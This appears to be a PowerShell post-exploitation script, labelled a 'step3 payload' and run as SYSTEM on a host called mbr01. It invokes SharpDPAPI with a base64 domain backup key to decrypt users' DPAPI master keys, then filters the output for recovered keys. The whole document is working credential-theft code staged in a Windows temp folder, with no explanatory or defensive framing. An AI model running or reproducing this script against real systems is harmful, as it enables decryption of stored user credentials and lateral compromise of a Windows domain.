# 3.5G step3 payload: new SharpDPAPI + legacy key base64 (as SYSTEM on mbr01)
$ErrorActionPreference = 'Continue'
$sdp = 'C:\Windows\Temp\cadre-tools\SharpDPAPI-new.exe'
$o = 'C:\Windows\Temp\sharpdpapi-out4.txt'
$legacyB64File = 'C:\Windows\Temp\cadre-tools\wt035g-legacy-b64.txt'

if (Test-Path $sdp) {
    Write-Output "NEW_SDP_PRESENT $((Get-Item $sdp).Length)"
    if (Test-Path $legacyB64File) {
        $b64 = (Get-Content $legacyB64File -Raw).Trim()
        Write-Output "LEGACY_B64_LEN $($b64.Length)"
        Remove-Item $o -ErrorAction SilentlyContinue
        & $sdp masterkeys "/pvk:$b64" > $o 2>&1
        Start-Sleep -Seconds 2
        Write-Output "OUT_SIZE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
        Get-Content $o -ErrorAction SilentlyContinue | Select-String -Pattern 'Found MasterKey|decryption|master key cache|\{|Error|Action|Preferred|Decrypted|No master' | Select-Object -First 45 | ForEach-Object { Write-Output "SDP3|$($_.Line)" }
    } else { Write-Output 'B64_FILE_MISSING' }
} else { Write-Output 'NEW_SDP_MISSING' }
Write-Output '3.5G_STEP3_DONE'
